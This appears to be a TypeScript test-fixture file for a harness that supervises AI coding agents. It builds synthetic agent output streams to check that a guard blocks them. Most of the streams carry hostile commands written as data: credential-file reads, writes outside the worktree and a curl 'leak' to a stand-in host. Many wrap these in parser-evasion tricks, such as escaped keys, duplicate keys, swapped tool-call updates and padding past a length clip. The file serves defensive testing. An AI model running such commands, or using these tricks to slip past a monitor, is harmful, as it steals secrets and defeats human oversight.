      // No readable command, target or non-empty tool name: a non-object `input` and an empty name stay `unknown`.
      name: "tool lines with non-object input and empty tool names, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Tool lines with nothing the parser can read; the adapter must report them unknown.", 0),
        JSON.stringify({ type: "tool_call", input: "git push origin main" }),
        JSON.stringify({ type: "tool_call", tool: "", input: ["git", "push"] }),
        JSON.stringify({ type: "tool_call_update", name: "", parameters: null }),
        JSON.stringify({ type: "tool_call", tool_name: 7, args: { command: null } }),
      ],
    },
    {
      // T4.23 second-pass gap: an object `input` without a command shadows `parameters`, `args` and `arguments` (no
      // merge), so the Git write below is invisible to the guard and the line is `unknown`. There is no `end` line: the
      // same call before a clean `end_turn` is success (fixture `shadowed_parameters.jsonl`), which is roadmap gap (1).
      name: "an object input without a command shadowing a Git write in parameters, args or arguments, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Shadowed parameter objects; the adapter must report them unknown.", 0),
        JSON.stringify({ type: "tool_call", input: {}, parameters: { command: "git push origin main" } }),
        JSON.stringify({ type: "tool_call", input: { description: "x" }, args: { command: "git push origin main" } }),
        JSON.stringify({ type: "tool_call_update", input: {}, arguments: { cmd: "git push origin main" } }),
      ],
    },
    {
      name: "an object input without a command shadowing a Git write in parameters, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Shadowed parameter objects at exit 1; the adapter must report them unknown.", 1),
        JSON.stringify({ type: "tool_call", input: {}, parameters: { command: "git push origin main" } }),
      ],
    },
    {
      name: "only unknown event kinds, exit 2",
      category: "unknown_events",
      exitCode: 2,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Event types below are invented; the adapter must report them unknown.", 2),
        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
        JSON.stringify({ type: "tool_call", input: "git push origin main" }),
      ],
    },
    {
      name: "only unknown event kinds, exit 137",
      category: "unknown_events",
      exitCode: 137,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Event types below are invented; the adapter must report them unknown.", 137),
        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
        JSON.stringify({ type: "tool_call", input: "git push origin main" }),
      ],
    },
    {
      name: "unreadable text, end and bare tool_call_update, exit 2",
      category: "unknown_events",
      exitCode: 2,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Unreadable text and end shapes without required fields at exit 2.", 2),
        JSON.stringify({ type: "text", data: { not: "a string" } }),
        JSON.stringify({ type: "end", stopReason: 123 }),
        JSON.stringify({ type: "tool_call_update" }),
      ],
    },
    {
      name: "unreadable text, end and bare tool_call_update, exit 137",
      category: "unknown_events",
      exitCode: 137,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Unreadable text and end shapes without required fields at exit 137.", 137),
        JSON.stringify({ type: "text", data: { not: "a string" } }),
        JSON.stringify({ type: "end", stopReason: 123 }),
        JSON.stringify({ type: "tool_call_update" }),
      ],
    },
    {
      name: "unrecognised end stopReason without a valid end line, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Unrecognised end stopReason without a subsequent valid end line at exit 0.", 0),
        JSON.stringify({ type: "end", stopReason: 123, sessionId: SID }),
      ],
    },
    {
      name: "unrecognised end stopReason without a valid end line, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Unrecognised end stopReason without a subsequent valid end line at exit 1.", 1),
        JSON.stringify({ type: "end", stopReason: 123, sessionId: SID }),
      ],
    },
    // T4.23 sixth pass: line types match exactly, and a duplicate `type` key resolves to the last value.
    ...[0, 1].flatMap((exitCode): HostileStream[] => [
      {
        name: `case and whitespace variants of tool_call and end carrying a Git write, exit ${exitCode}`,
        category: "unknown_events",
        exitCode,
        failureCode: exitCode === 0 ? "OUTPUT_PROTOCOL_ERROR" : "TOOL_FAILURE",
        lines: [
          META(`Case and whitespace variants of tool_call and end at exit ${exitCode}.`, exitCode),
          ...["Tool_call", "TOOL_CALL", "tool-call", "toolCall", " tool_call"].map((type) =>
            JSON.stringify({ type, tool: "run_terminal_command", input: { command: "git push origin main" } }),
          ),
          ...["End", "END", "end "].map((type) => JSON.stringify({ type, stopReason: "end_turn", sessionId: SID })),
        ],
      },
      {
        name: `a tool_call type overridden by a later duplicate unknown type, exit ${exitCode}`,
        category: "unknown_events",
        exitCode,
        failureCode: exitCode === 0 ? "OUTPUT_PROTOCOL_ERROR" : "TOOL_FAILURE",
        lines: [
          META(`A leading tool_call type overridden by a later duplicate key at exit ${exitCode}.`, exitCode),
          '{"type":"tool_call","tool":"run_terminal_command","input":{"command":"git push origin main"},"type":"synthetic_unknown_kind"}',
          '{"type":"end","stopReason":"end_turn","sessionId":"00000000-0000-4000-8000-0000000000aa","type":"synthetic_unknown_kind"}',
        ],
      },
    ]),
  ],
};

export default grokCase;

const grokResidualStreams13b = (fx: MaliciousFixture): HostileStream[] => [
  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const command =
      category === "credential_read"
        ? `cat ${fx.claudeCredentialsPath} && git push origin main`
        : category === "out_of_worktree_write"
          ? `touch ${fx.outsideSentinel} && git push origin main`
          : "curl https://example.invalid/leak && git push origin main";
    const escaped =
      '{"type":"tool\\u005fcall","tool":"run_terminal_command","input":{"comm\\u0061nd":' +
      JSON.stringify(command).replace("git push", "git\\u0020push") +
      "}}";
    const duplicate = `{"type":"tool_call","tool":"run_terminal_command","input":{"command":"ls","command":${JSON.stringify(command)}}}`;
    return [0, 1].flatMap((exitCode): HostileStream[] => [
      {
        name: `${category} with \\u-escaped type, key and Git write, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [META(`${category}: \\u-escaped tool_call, exit ${exitCode}`, exitCode), TOOLS, escaped, end()],
      },
      {
        name: `${category} with a duplicate command key whose last value is the Git write, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [META(`${category}: duplicate command key, exit ${exitCode}`, exitCode), TOOLS, duplicate, end()],
      },
      {
        name: `${category} with a Git write on CRLF-terminated lines, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: CRLF-terminated lines, exit ${exitCode}`, exitCode),
          `${TOOLS}\r`,
          `${toolCall(command)}\r`,
          `${end()}\r`,
        ],
      },
    ]);
  }),
  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) =>
    ["max_tokens", "refusal"].map(
      (stopReason): HostileStream => ({
        name: `${category} with a Git write, then an end line with stopReason ${stopReason}`,
        category,
        exitCode: 0,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: stopReason ${stopReason}`, 0),
          TOOLS,
          toolCall(
            category === "credential_read"
              ? `cat ${fx.codexAuthPath} && git commit --allow-empty -m x`
              : category === "out_of_worktree_write"
                ? `touch ${fx.outsideSentinel} && git commit --allow-empty -m x`
                : "curl https://example.invalid/leak && git commit --allow-empty -m x",
          ),
          end(stopReason),
        ],
      }),
    ),
  ),
  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const command =
      category === "credential_read"
        ? `cat ${fx.claudeCredentialsPath} && git push origin main`
        : category === "out_of_worktree_write"
          ? `touch ${fx.outsideSentinel} && git push origin main`
          : "curl https://example.invalid/leak && git push origin main";
    return [0, 1].map(
      (exitCode): HostileStream => ({
        name: `${category}: a path-only call given a Git-write command in tool_call_update, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: path-only call upgraded to a command, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", id: "call_p", tool: "read_file", input: { path: "README.md" } }),
          JSON.stringify({ type: "tool_call_update", id: "call_p", tool: "read_file", input: { command } }),
          end(),
        ],
      }),
    );
  }),
  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const command =
      category === "credential_read"
        ? `cat ${fx.codexAuthPath} && git push origin main`
        : category === "out_of_worktree_write"
          ? `touch ${fx.outsideSentinel} && git push origin main`
          : "curl https://example.invalid/leak && git push origin main";
    return [2, 137].flatMap((exitCode): HostileStream[] => [
      {
        name: `${category}: a benign call swapped to a Git write in tool_call_update, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: swapped in tool_call_update, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", id: "call_s", tool: "run_terminal_command", input: { command: "ls" } }),
          JSON.stringify({ type: "tool_call_update", id: "call_s", status: "in_progress", input: { command } }),
          ...(exitCode === 2 ? [end()] : []),
        ],
      },
      {
        name: `${category}: a Git write after the end line, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [META(`${category}: after the end line, exit ${exitCode}`, exitCode), TOOLS, end(), toolCall(command)],
      },
    ]);
  }),
];

const grokResidualStreams13c = (fx: MaliciousFixture): HostileStream[] =>
  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const command =
      category === "credential_read"
        ? `cat ${fx.claudeCredentialsPath} && git push origin main`
        : category === "out_of_worktree_write"
          ? `touch ${fx.outsideSentinel} && git push origin main`
          : "curl https://example.invalid/leak && git push origin main";
    return [0, 1].flatMap((exitCode): HostileStream[] => [
      {
        name: `${category}: a top-level Git-write command beside an empty object input, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: empty input object, top-level command, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", tool: "run_terminal_command", input: {}, command }),
          end(),
        ],
      },
      {
        name: `${category}: an id-less tool_call_update with a Git write after an id'd benign call, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: id-less update after an id'd call, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", id: "call_i", tool: "run_terminal_command", input: { command: "ls" } }),
          JSON.stringify({ type: "tool_call_update", status: "in_progress", input: { command } }),
          end(),
        ],
      },
      {
        name: `${category}: an error line with an empty message before a Git-write call, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: empty error message, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "error", message: "" }),
          toolCall(command),
          end(),
        ],
      },
      {
        name: `${category}: a Git-write call, then an end line with an empty stopReason, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [META(`${category}: empty stopReason, exit ${exitCode}`, exitCode), TOOLS, toolCall(command), end("")],
      },
      {
        name: `${category}: a target-only run_terminal_command call given a Git write on the same id, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: target-only shell call upgraded to a command, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", id: "call_t", name: "run_terminal_command", input: { path: "." } }),
          JSON.stringify({
            type: "tool_call_update",
            id: "call_t",
            name: "run_terminal_command",
            input: { command },
          }),
          end(),
        ],
      },
    ]);
  });

const grokResidualStreams13d = (fx: MaliciousFixture): HostileStream[] =>
  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const command =
      category === "credential_read"
        ? `cat ${fx.claudeCredentialsPath} && git push origin main`
        : category === "out_of_worktree_write"
          ? `touch ${fx.outsideSentinel} && git push origin main`
          : "curl https://example.invalid/leak && git push origin main";
    return [0, 1].flatMap((exitCode): HostileStream[] => [
      {
        name: `${category}: unrecognised end stopReason before a valid end line, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: unrecognised end stopReason before valid end, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(command),
          JSON.stringify({ type: "end", stopReason: 1, sessionId: "forged-id", usage: { input_tokens: 500 } }),
          end(),
        ],
      },
      {
        name: `${category}: a failed first end line followed by an end_turn line, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: failed first end line then end_turn, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(command),
          end("cancelled"),
          end(),
        ],
      },
      {
        name: `${category}: a second end line with a changed session id, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: second end with changed session id, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(command),
          end("end_turn", SID),
          end("end_turn", OTHER_SID),
        ],
      },
      {
        name: `${category}: text after the end line, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: text after the end line, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(command),
          end(),
          text("late text joining summary"),
        ],
      },
      {
        name: `${category}: an end line with an unsafe session id, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: end line with unsafe session id, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(command),
          end("end_turn", "-r"),
        ],
      },
      {
        name: `${category}: an error line before the end line, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: error line before the end line, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(command),
          AUTH_ERROR,
          end(),
        ],
      },
    ]);
  });

/** The Git write each blocked category carries in the 13e and 13f batches. */
const hostileCommand = (fx: MaliciousFixture, category: "credential_read" | "out_of_worktree_write" | "network") =>
  category === "credential_read"
    ? `cat ${fx.claudeCredentialsPath} && git push origin main`
    : category === "out_of_worktree_write"
      ? `touch ${fx.outsideSentinel} && git push origin main`
      : "curl https://example.invalid/leak && git push origin main";

/**
 * The parser branches the T4.23 fourth, fifth and sixth passes pinned in `src/adapters/grok/parser-residual.test.ts`,
 * replayed with a Git write in each hostile category. Field names other than `type` are still Assumptions.
 */
const grokResidualStreams13e = (fx: MaliciousFixture): HostileStream[] =>
  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const command = hostileCommand(fx, category);
    return [0, 1].flatMap((exitCode): HostileStream[] => [
      {
        // Fourth pass: the unsafe first `end` binds nothing, so the second, anomalous `end` binds the only id.
        name: `${category}: a Git-write call, an end line with an unsafe session id, then a second end line, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: unsafe first end, then a second end, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(command),
          end("end_turn", "--unsafe"),
          end(),
        ],
      },
      {
        // Fourth pass: a `sessionId` on a line other than `end` never binds or conflicts.
        name: `${category}: a Git-write tool_call carrying a decoy sessionId, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: decoy sessionId on the tool_call, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", tool: "run_terminal_command", sessionId: OTHER_SID, input: { command } }),
          end(),
        ],
      },
      {
        // Fifth pass: a command is never clipped, so a Git write after 5,000 characters still reaches the guard.
        name: `${category}: a Git write at the end of a 5,000-character command, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: Git write after a long command, exit ${exitCode}`, exitCode),
          TOOLS,
          toolCall(`echo ${"x".repeat(5_000)} && ${command}`),
          end(),
        ],
      },
      {
        // Fifth pass: a caller id equal to the generated key `call_1` shares that call; a new command is reported.
        name: `${category}: a caller id equal to the generated call key swapped to a Git write, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: caller id call_1 swapped to a Git write, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", tool: "run_terminal_command", input: { command: "git status" } }),
          JSON.stringify({ type: "tool_call_update", id: "call_1", input: { command: "git status" } }),
          JSON.stringify({ type: "tool_call_update", id: "call_1", input: { command } }),
          end(),
        ],
      },
      ...([null, 7] as const).map(
        (input): HostileStream => ({
          // Sixth pass: only an object `input` without a command hides `parameters` (second pass); these do not.
          name: `${category}: a Git write in parameters beside a ${JSON.stringify(input)} input, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category}: ${JSON.stringify(input)} input beside parameters, exit ${exitCode}`, exitCode),
            TOOLS,
            JSON.stringify({ type: "tool_call", tool: "run_terminal_command", input, parameters: { command } }),
            end(),
          ],
        }),
      ),
      {
        // Sixth pass: the guard reads a shell call's target when it has no command (see grokResidualStreams13f).
        name: `${category}: a short Git write carried only as a shell call's target, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: Git write as a shell target, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", name: "run_terminal_command", input: { path: command } }),
          end(),
        ],
      },
      {
        // Sixth pass: an empty `id` shadows `call_id`, so the update on that call_id opens a new call (over-reports).
        name: `${category}: an empty id beside call_id, then a Git write on that call_id, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: empty id shadowing call_id, exit ${exitCode}`, exitCode),
          TOOLS,
          JSON.stringify({ type: "tool_call", id: "", call_id: "c1", input: { command: "git status" } }),
          JSON.stringify({ type: "tool_call_update", call_id: "c1", input: { command } }),
          end(),
        ],
      },
      {
        // Sixth pass: duplicate keys resolve to the last one (JSON.parse), so a leading `text` type cannot hide a call.
        name: `${category}: a duplicate type key whose last value is tool_call, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: duplicate type key, exit ${exitCode}`, exitCode),
          TOOLS,
          `{"type":"text","data":"x","type":"tool_call","tool":"run_terminal_command","input":{"command":${JSON.stringify(command)}}}`,
          end(),
        ],
      },
      {
        // Sixth pass: an empty text chunk is a message, never unknown.
        name: `${category}: an empty text chunk before a Git-write call, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        lines: [
          META(`${category}: empty text chunk, exit ${exitCode}`, exitCode),
          TOOLS,
          text(""),
          toolCall(command),
          end(),
        ],
      },
    ]);
  });

/**
 * Residual blocked streams (T4.26, as T4.36 and T4.46): JSON encodings, further stop reasons,
 * path-only calls upgraded to command in tool_call_update, swapped and trailing calls at exit 2/137,
 * second-pass parser branches, third-pass stream-order and anomaly branches, and fourth- to sixth-pass session-id,
 * long-command, call-key, parameter-shape, shadowing-key and duplicate-key branches from T4.23, and the closed
 * target-only shell gap. Synthetic lines only; no provider is run.
 */
export const grokResidualStreams = (fx: MaliciousFixture): HostileStream[] => [
  ...grokResidualStreams13b(fx),
  ...grokResidualStreams13c(fx),
  ...grokResidualStreams13d(fx),
  ...grokResidualStreams13e(fx),
  ...grokResidualStreams13f(fx),
  ...grokEighthPassStreams(fx),
];

/**
 * The target-only shell gap #449 pinned and #451 documented, closed on 2026-10-15 (T4.23, T4.26): a shell call that
 * carries its command only in a target key hands the whole line to the guard, not the 512-character clip, and a
 * target-only update without a name on a shell call stays a shell call. Each was an `ok` run at exit 0 and only a
 * `TOOL_FAILURE` at exit 1 before the fix; both now end blocked. Whether the native CLI ever puts a command in a
 * target field is unknown: the live check recorded no `tool_call` command or target fields.
 */
const grokResidualStreams13f = (fx: MaliciousFixture): HostileStream[] =>
  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) =>
    [0, 1].flatMap((exitCode): HostileStream[] => {
      const long = `echo ${"x".repeat(600)} && ${hostileCommand(fx, category)}`;
      return [
        {
          name: `${category}: a Git write past the 512-character clip of a target-only shell call, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category}: Git write past the target clip, exit ${exitCode}`, exitCode),
            TOOLS,
            JSON.stringify({ type: "tool_call", name: "run_terminal_command", input: { path: long } }),
            end(),
          ],
        },
        {
          name: `${category}: a nameless target-only update on a shell call carrying a Git write, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category}: nameless target-only update on a shell call, exit ${exitCode}`, exitCode),
            TOOLS,
            JSON.stringify({ type: "tool_call", id: "call_s", name: "run_terminal_command", input: { path: "." } }),
            JSON.stringify({ type: "tool_call_update", id: "call_s", input: { path: long } }),
            end(),
          ],
        },
      ];
    }),
  );

/**
 * #470 eighth-pass positive controls replayed through the malicious harness (T4.26, ADR-0039).
 * A non-string command must not hide a hostile shell target. A read renamed with a new target must retain shell
 * identity for a later nameless target update. The shadowed-target and deduplicated-rename gaps remain separate;
 * these controls make no claim that those gaps are closed. Synthetic fields only, not a native capture.
 */
export const grokEighthPassStreams = (fx: MaliciousFixture): HostileStream[] =>
  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) =>
    [0, 1].flatMap((exitCode): HostileStream[] => {
      const command = hostileCommand(fx, category);
      return [
        {
          name: `${category}: a non-string command beside a hostile shell target, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category}: non-string command beside shell target (#470)`, exitCode),
            TOOLS,
            JSON.stringify({ type: "tool_call", name: "run_terminal_command", input: { command: 0, path: command } }),
            end(),
          ],
        },
        {
          name: `${category}: a read renamed with a new target before a nameless hostile update, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category}: shell identity after read rename (#470)`, exitCode),
            TOOLS,
            JSON.stringify({ type: "tool_call", id: "r1", tool: "read_file", input: { path: "notes.txt" } }),
            JSON.stringify({ type: "tool_call_update", id: "r1", name: "run_terminal_command", input: { path: "ls" } }),
            JSON.stringify({ type: "tool_call_update", id: "r1", input: { path: command } }),
            end(),
          ],
        },
      ];
    }),
  );

/**
 * Partial streams (T4.26): the output ends inside a line, after a hostile call or before it. The supervisor ends such
 * a run `OUTPUT_PROTOCOL_ERROR` on the unparseable line (`src/exec/supervisor.ts`), which outranks the tool-call guard
 * in the shared precedence (`src/adapters/failure.ts`). They are not hostile-category streams (those must end blocked),
 * so `test/malicious/adapter-leg.test.ts` replays them on their own: never success, hostile checkout untouched.
 * The exit-1 shapes are replayed again at exit 2 and exit 137, as the blocked matrix does: the unparseable-line outcome
 * also outranks the unexpected exit's `TOOL_FAILURE`.
 */
export const grokPartialStreams = (fx: MaliciousFixture): HostileStream[] => {
  const streams = grokHandWrittenPartialStreams(fx);
  return [
    ...streams,
    ...streams
      .filter((s) => s.exitCode === 1)
      .flatMap((s) =>
        [2, 137].map((exitCode): HostileStream => {
          const name = s.name.replace(/, exit 1$/, `, exit ${exitCode}`);
          return { ...s, name, exitCode, lines: [META(name, exitCode), ...s.lines.slice(1)] };
        }),
      ),
  ];
};

const grokHandWrittenPartialStreams = (fx: MaliciousFixture): HostileStream[] => [
  // Complete both cut positions for each category and exit. A cut before the hostile line proves framing failure,
  // even though the later tool call is not reached; a cut after it proves protocol failure outranks the guard.
  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const command =
      category === "credential_read"
        ? `cat ${fx.claudeCredentialsPath} && git push origin main`
        : category === "out_of_worktree_write"
          ? `touch ${fx.outsideSentinel} && git push origin main`
          : "curl https://example.invalid/leak && git push origin main";
    return [0, 1].flatMap((exitCode): HostileStream[] => {
      const before = category !== "out_of_worktree_write" || exitCode !== 0;
      const after = category === "out_of_worktree_write" && exitCode === 0;
      return [
        ...(before
          ? [
              {
                name: `output cut before ${category}, exit ${exitCode}`,
                category,
                exitCode,
                failureCode: "OUTPUT_PROTOCOL_ERROR" as const,
                lines: [
                  META(`output cut before ${category}`, exitCode),
                  TOOLS,
                  '{"type":"tool_',
                  toolCall(command),
                  end(),
                ],
              },
            ]
          : []),
        ...(after
          ? [
              {
                name: `${category}, then output cut inside the end line, exit ${exitCode}`,
                category,
                exitCode,
                failureCode: "OUTPUT_PROTOCOL_ERROR" as const,
                lines: [
                  META(`${category}, then output cut inside the end line`, exitCode),
                  TOOLS,
                  toolCall(command),
                  end().slice(0, 25),
                ],
              },
            ]
          : []),
      ];
    });
  }),
  {
    name: "credential read, then output cut inside the end line",
    category: "credential_read",
    exitCode: 0,
    failureCode: "OUTPUT_PROTOCOL_ERROR",
    lines: [
      META("credential read, then output cut inside the end line", 0),
      TOOLS,
      toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
      end().slice(0, 25),
    ],
  },
  {
    name: "network call, then output cut inside a trailing tool_call, exit 1",
    category: "network",
    exitCode: 1,
    failureCode: "OUTPUT_PROTOCOL_ERROR",
    lines: [
      META("network call, then output cut inside a trailing tool_call, exit 1", 1),
      TOOLS,
      toolCall("curl https://example.invalid/leak && git push origin main"),
      '{"type":"tool_call","tool":"run_terminal_command","input":{"command":"touch',
    ],
  },
  {
    // The cut line comes first: the supervisor fails the run on the malformed line before the hostile call.
    name: "output cut before an out-of-worktree write, then an end line",
    category: "out_of_worktree_write",
    exitCode: 0,
    failureCode: "OUTPUT_PROTOCOL_ERROR",
    lines: [
      META("output cut before an out-of-worktree write, then an end line", 0),
      TOOLS,
      '{"type":"tool_',
      toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
      end(),
    ],
  },
  {
    name: "credential read, then output cut inside a tool_call_update, exit 1",
    category: "credential_read",
    exitCode: 1,
    failureCode: "OUTPUT_PROTOCOL_ERROR",
    lines: [
      META("credential read, then output cut inside a tool_call_update, exit 1", 1),
      TOOLS,
      toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
      '{"type":"tool_call_update","arguments":{"CommandLine":"git commit',
    ],
  },
  {
    name: "network call, then output cut inside a tool_call",
    category: "network",
    exitCode: 0,
    failureCode: "OUTPUT_PROTOCOL_ERROR",
    lines: [
      META("network call, then output cut inside a tool_call", 0),
      TOOLS,
      toolCall("curl https://example.invalid/leak && git push origin main"),
      '{"type":"tool_call","input":{"command":"git push',
    ],
  },
  {
    name: "out-of-worktree write, then output cut inside a tool_call_update, exit 1",
    category: "out_of_worktree_write",
    exitCode: 1,
    failureCode: "OUTPUT_PROTOCOL_ERROR",
    lines: [
      META("out-of-worktree write, then output cut inside a tool_call_update, exit 1", 1),
      TOOLS,
      toolCall(`touch ${fx.outsideSentinel} && git commit --allow-empty -m x`),
      '{"type":"tool_call_update","parameters":{"command":"git reset',
    ],
  },
];

/**
 * The compiled cells (T4.26), pinned beyond flag presence: `compileProblems` only asks whether each isolation word is
 * somewhere in the argv, so a compile that adds a second, wider `--sandbox` value, writes `--sandbox=<value>`, or
 * separates `--sandbox` from its value would still pass it. Which of two `--sandbox` values the CLI honours was not
 * checked (**Assumption:** the last, as clap-style parsers do), so the leg requires exactly one. `writable: false` is
 * the read-only workspace request, which compiles `read-only` from a worktree scope.
 */
export interface GrokCompiledCell {
  label: string;
  profile: ResolvedProfile;
  writable: boolean;
  sandbox: "strict" | "workspace" | "read-only";
  /** `--disable-web-search` is compiled exactly when network is `off`. */
  webSearchOff: boolean;
}

export const grokCompiledCells: readonly GrokCompiledCell[] = [
  { label: "strict", profile: PRIVILEGED_BYPASS_PROFILE, writable: true, sandbox: "strict", webSearchOff: true },
  {
    label: "workspace (network on)",
    profile: privilegedProfile({ ...BYPASS_SCOPE, network: { mode: "on" } }),
    writable: true,
    sandbox: "workspace",
    webSearchOff: false,
  },
  {
    label: "read-only files",
    profile: privilegedProfile({ ...BYPASS_SCOPE, files: { access: "read-only" } }),
    writable: true,
    sandbox: "read-only",
    webSearchOff: true,
  },
  {
    label: "read-only workspace request",
    profile: PRIVILEGED_BYPASS_PROFILE,
    writable: false,
    sandbox: "read-only",
    webSearchOff: true,
  },
];

/** The policy flags one cell must compile, in order, as one contiguous run of the argv. */
export const grokCellPolicyFlags = (cell: GrokCompiledCell): string[] => [
  "--sandbox",
  cell.sandbox,
  ...(cell.webSearchOff ? ["--disable-web-search"] : []),
  "--always-approve",
];

/** Findings for one compiled cell; empty when its sandbox, web-search and approval flags are exactly the cell's. */
export function grokCellProblems(inv: Invocation, cell: GrokCompiledCell): string[] {
  const problems: string[] = [];
  const count = (flag: string) => inv.argv.filter((a) => a === flag).length;
  for (const [flag, want] of [
    ["--sandbox", 1],
    ["--always-approve", 1],
    ["--disable-web-search", cell.webSearchOff ? 1 : 0],
  ] as const) {
    if (count(flag) !== want) problems.push(`${cell.label}: ${flag} ${count(flag)} times, want ${want}`);
  }
  for (const a of inv.argv) {
    if (/^--(sandbox|always-approve|disable-web-search)=/.test(a)) problems.push(`${cell.label}: inline form ${a}`);
  }
  const at = inv.argv.indexOf("--sandbox");
  if (at !== -1 && inv.argv[at + 1] !== cell.sandbox)
    problems.push(`${cell.label}: --sandbox ${inv.argv[at + 1]}, want ${cell.sandbox}`);
  const want = grokCellPolicyFlags(cell);
  if (JSON.stringify(inv.policyFlags) !== JSON.stringify(want))
    problems.push(`${cell.label}: policyFlags ${JSON.stringify(inv.policyFlags)}, want ${JSON.stringify(want)}`);
  if (at === -1 || JSON.stringify(inv.argv.slice(at, at + want.length)) !== JSON.stringify(want))
    problems.push(`${cell.label}: argv does not carry ${want.join(" ")} contiguously`);
  return problems;
}

/**
 * Scopes Grok Build must refuse (src/adapters/grok/adapter.ts `#build` steps 3 to 6), each in the hostile checkout.
